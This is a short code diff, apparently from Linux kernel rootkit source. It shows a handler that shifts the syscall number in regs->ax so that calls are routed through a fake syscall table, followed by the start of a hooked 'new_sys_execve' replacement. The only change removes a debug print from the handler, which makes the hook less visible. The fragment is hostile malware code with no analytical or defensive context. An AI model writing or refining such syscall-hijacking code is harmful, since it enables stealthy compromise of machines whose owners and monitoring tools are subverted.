@@ -21,7 +21,6 @@ void handler(struct pt_regs *regs)
 {
   unsigned long off = ((unsigned long)fake_sct - (unsigned long)sct);
   regs->ax += off / sizeof(unsigned long);
-  debug_print("Handler executed");
 }
 
 static asmlinkage int new_sys_execve(const struct pt_regs *pt_regs)
